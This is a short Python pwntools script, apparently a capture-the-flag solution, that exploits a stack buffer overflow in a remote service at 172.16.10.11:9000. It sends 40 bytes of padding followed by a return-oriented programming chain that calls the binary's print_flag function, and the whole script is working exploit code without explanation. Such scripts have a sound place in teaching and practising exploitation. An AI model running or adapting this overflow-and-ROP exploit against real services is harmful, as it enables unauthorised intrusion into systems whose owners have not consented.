from pwn import *

context.update(arch='amd64', os='linux')
pty = process.PTY

elf = ELF('./original')
p = remote('172.16.10.11', 9000)

print(p.recvuntil("Psttt...what's the secret code? "))

rop = ROP(elf)

rop.call(elf.symbols['print_flag'])

payload = [
    b'A' * 40,
    rop.chain()
]

p.sendline(b''.join(payload))

print(p.recvuntil('\n'))

print(p.recv())
